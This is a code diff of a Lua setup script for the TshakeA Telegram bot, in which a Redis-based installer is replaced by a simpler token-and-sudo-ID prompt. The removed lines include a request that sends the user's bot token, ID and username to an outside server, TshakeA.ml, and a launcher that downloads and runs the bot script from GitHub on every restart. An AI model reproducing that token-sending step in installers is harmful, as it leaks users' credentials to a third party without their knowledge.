@@ -1,112 +1,54 @@
-serpent = dofile("./File_Libs/serpent.lua")
+sudo_TSHAKEA = dofile("sudo.lua")
 https = require("ssl.https")
-http = require("socket.http")
-JSON = dofile("./File_Libs/JSON.lua")
-local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_TshakeA = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_TshakeA = function() 
-local Create_Info = function(Token,Sudo,UserName)  
-local TshakeA_Info_Sudo = io.open("sudo.lua", 'w')
-TshakeA_Info_Sudo:write([[
-token = "]]..Token..[["
-
-Sudo = ]]..Sudo..[[  
-
-UserName = "]]..UserName..[["
-]])
-TshakeA_Info_Sudo:close()
-end  
-if not database:get(Server_TshakeA.."Token_TshakeA") then
-print("\27[1;34m»» Send Your Token Bot :\27[m")
-local token = io.read()
-if token ~= '' then
-local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-if res ~= 200 then
-io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
+JSON = dofile("./libs/JSON.lua")
+local TSHAKEA_dev = io.open("TSHAKEA_online.lua")
+if TSHAKEA_dev then
+TSHAKEA_on = {string.match(TSHAKEA_dev:read('*all'), "^(.*)/(%d+)")}
+local tsheke_file = io.open("sudo.lua", 'w')
+tsheke_file:write("token = '" ..TSHAKEA_on[1].."'\n\nsudo_add = "..TSHAKEA_on[2].."" )
+tsheke_file:close()
+https.request("https://api.telegram.org/bot"..TSHAKEA_on[1].."/sendMessage?chat_id="..TSHAKEA_on[2].."&text=Bot_TSHAKEA_is_start_new")
+os.execute('cd .. && rm -rf .telegram-cli')
+os.execute('rm -rf TSHAKEA_online.lua')  
+os.execute('./tg -s ./TSHAKEA.lua $@ --bot='..TSHAKEA_on[1])
+end
+function chack(tokenCk)
+local getme = "https://api.telegram.org/bot" ..tokenCk.. '/getme'
+local req = https.request(getme)
+local data = JSON:decode(req)
+if data.ok == true then
+print("\27[31m✓ DONE\27[m \27[1;34m»»Now Send Sudo ID««\27[m")
+local sudo_send  = io.read()
+print("\27[31m✓ DONE\27[m")
+local tsheke_file = io.open("sudo.lua", 'w')
+tsheke_file:write("token = '" ..tokenCk.."'\n\nsudo_add = "..sudo_send.."" )
+tsheke_file:close()
+os.execute('cd .. && rm -fr .telegram-cli')
+os.execute('cd && rm -fr .telegram-cli')
+os.execute('./tg -s ./TSHAKEA.lua $@ --bot='..tokenCk)
 else
-io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_TshakeA.."Token_TshakeA",token)
-end 
+print("\27[31m»»This TOKEN Incorrect , Send Right TOKEN««\27[m")
+local token_send = io.read()
+chack(token_send)
+end
+end
+os.execute('cd .. && rm -rf .telegram-cli')
+if token and token == "TOKEN" then 
+print("\27[1;34m»»Send Your Bot TOKEN««\27[m")
+local token_send = io.read()
+chack(token_send)
+else 
+os.execute('cd .. && rm -fr .telegram-cli')
+os.execute('cd && rm -fr .telegram-cli')
+sudo_TSHAKEA = dofile("sudo.lua")
+local getme = "https://api.telegram.org/bot" ..token.. '/getme'
+local req = https.request(getme)
+local data = JSON:decode(req)
+if data.ok == true then
+os.execute('./tg -s ./TSHAKEA.lua $@ --bot='..token)
 else
-io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
-end 
-os.execute('lua start.lua')
-end
-------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------
-if not database:get(Server_TshakeA.."UserName_TshakeA") then
-print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
-local UserName = io.read():gsub('@','')
-if UserName ~= '' then
-local Get_Info = http.request("http://TshakeA.ml/info/?user="..UserName)
-if Get_Info:match('Is_Spam') then
-io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
-return false
-end
-local Json = JSON:decode(Get_Info)
-if Json.Info == false then
-io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
-os.execute('lua start.lua')
-else
-if Json.Info == 'Channel' then
-io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
-os.execute('lua start.lua')
-else
-io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_TshakeA.."UserName_TshakeA",Json.Info.Username)
-database:set(Server_TshakeA.."Id_TshakeA",Json.Info.Id)
+print("\27[31mTOKEN Incorrect , Send Right TOKEN««\27[m")
+local token_send = io.read()
+chack(token_send)
 end
 end
-else
-io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
-end 
-os.execute('lua start.lua')
-end
-local function Files_TshakeA_Info()
-Create_Info(database:get(Server_TshakeA.."Token_TshakeA"),database:get(Server_TshakeA.."Id_TshakeA"),database:get(Server_TshakeA.."UserName_TshakeA"))   
-http.request("http://TshakeA.ml/add/?id="..database:get(Server_TshakeA.."Id_TshakeA").."&user="..database:get(Server_TshakeA.."UserName_TshakeA").."&token="..database:get(Server_TshakeA.."Token_TshakeA"))
-local RunTshakeA = io.open("TshakeA", 'w')
-RunTshakeA:write([[
-#!/usr/bin/env bash
-cd $HOME/TshakeA
-token="]]..database:get(Server_TshakeA.."Token_TshakeA")..[["
-rm -fr TshakeA.lua
-wget "https://raw.githubusercontent.com/TshakeAab/TshakeA/master/TshakeA.lua"
-while(true) do
-rm -fr ../.telegram-cli
-./tg -s ./TshakeA.lua -p PROFILE --bot=$token
-done
-]])
-RunTshakeA:close()
-local RunTs = io.open("ts", 'w')
-RunTs:write([[
-#!/usr/bin/env bash
-cd $HOME/TshakeA
-while(true) do
-rm -fr ../.telegram-cli
-screen -S TshakeA -X kill
-screen -S TshakeA ./TshakeA
-done
-]])
-RunTs:close()
-end
-Files_TshakeA_Info()
-database:del(Server_TshakeA.."Token_TshakeA");database:del(Server_TshakeA.."Id_TshakeA");database:del(Server_TshakeA.."UserName_TshakeA")
-sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
-end 
-local function Load_File()  
-local f = io.open("./sudo.lua", "r")  
-if not f then   
-AutoFiles_TshakeA()  
-var = true
-else   
-f:close()  
-database:del(Server_TshakeA.."Token_TshakeA");database:del(Server_TshakeA.."Id_TshakeA");database:del(Server_TshakeA.."UserName_TshakeA")
-sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
-var = false
-end  
-return var
-end
-Load_File()
